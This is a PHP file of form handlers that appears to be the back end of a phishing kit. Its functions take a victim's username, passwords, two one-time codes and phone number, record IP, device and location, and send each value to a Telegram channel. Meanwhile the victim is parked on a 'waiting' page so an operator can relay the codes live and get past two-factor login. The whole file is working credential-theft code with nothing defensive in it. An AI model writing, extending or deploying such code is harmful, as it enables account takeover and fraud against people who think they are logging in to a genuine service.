<?php
// includes/post_handlers.php

require_once __DIR__ . '/functions.php'; 
require_once __DIR__ . '/db.php';

/**
 * Handle POST for login.
 * This now also detects device info and geolocation.
 */
function handleLoginPost($sessionId) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'] ?? '';
        
        // Get IP address (considering Cloudflare headers)
        $ip = isset($_SERVER['HTTP_CF_CONNECTING_IP'])
            ? $_SERVER['HTTP_CF_CONNECTING_IP']
            : (isset($_SERVER['HTTP_X_FORWARDED_FOR'])
                ? trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0])
                : ($_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN'));
        
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $device = getDeviceInfo($userAgent);
        $location = getGeoLocation($ip);
        
        $sessionData = [
            'session_id'    => $sessionId,
            'username'      => $username,
            'ip_address'    => $ip,
            'device'        => $device,
            'location'      => $location,
            'status'        => 'password',
            'last_update'   => time(),
            'update_source' => 'user'
        ];
        saveSession($sessionData);

        $msg = "Username: $username\nIP: $ip";
        sendToTelegram($msg, 'login', $sessionId);

        header('Location: ' . generatePageUrl('password.php', $sessionId));
        exit;
    }
}

/**
 * Handle POST for password
 */
function handlePasswordPost($sessionId) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $password = $_POST['password'] ?? '';
        updateSessionField($sessionId, 'password', $password);

        $sess = getSession($sessionId);
        $ip = $sess['ip_address'] ?? 'UNKNOWN';

        $msg = "Password: $password\nIP: $ip";
        sendToTelegram($msg, 'password', $sessionId);

        updateSessionStatus($sessionId, 'waiting', 'user');
        header('Location: ' . generatePageUrl('waiting.php', $sessionId));
        exit;
    }
}

/**
 * Handle POST for password2
 */
function handlePassword2Post($sessionId) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $password2 = $_POST['password2'] ?? '';
        updateSessionField($sessionId, 'password2', $password2);

        $sess = getSession($sessionId);
        $ip = $sess['ip_address'] ?? 'UNKNOWN';

        $msg = "Password2: $password2\nIP: $ip";
        sendToTelegram($msg, 'password2', $sessionId);

        updateSessionStatus($sessionId, 'waiting', 'user');
        header('Location: ' . generatePageUrl('waiting.php', $sessionId));
        exit;
    }
}

/**
 * Handle POST for otp
 */
function handleOtpPost($sessionId) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $otp = $_POST['otp'] ?? '';
        updateSessionField($sessionId, 'otp', $otp);

        $sess = getSession($sessionId);
        $ip = $sess['ip_address'] ?? 'UNKNOWN';

        $msg = "PhoneOtp: $otp\nIP: $ip";
        sendToTelegram($msg, 'PhoneOtp', $sessionId);

        updateSessionStatus($sessionId, 'waiting', 'user');
        header('Location: ' . generatePageUrl('waiting.php', $sessionId));
        exit;
    }
}

/**
 * Handle POST for otp2
 */
function handleOtp2Post($sessionId) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $otp2 = $_POST['otp2'] ?? '';
        updateSessionField($sessionId, 'otp2', $otp2);

        $sess = getSession($sessionId);
        $ip = $sess['ip_address'] ?? 'UNKNOWN';

        $msg = "PhoneOtp2: $otp2\nIP: $ip";
        sendToTelegram($msg, 'PhoneOtp2', $sessionId);

        updateSessionStatus($sessionId, 'waiting', 'user');
        header('Location: ' . generatePageUrl('waiting.php', $sessionId));
        exit;
    }
}

/**
 * Handle POST for phone
 */
function handlePhonePost($sessionId) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $phone = $_POST['phone'] ?? '';
        updateSessionField($sessionId, 'phone', $phone);

        $sess = getSession($sessionId);
        $ip = $sess['ip_address'] ?? 'UNKNOWN';

        $msg = "Phone: $phone\nIP: $ip";
        sendToTelegram($msg, 'phone', $sessionId);

        updateSessionStatus($sessionId, 'waiting', 'user');
        header('Location: ' . generatePageUrl('waiting.php', $sessionId));
        exit;
    }
}
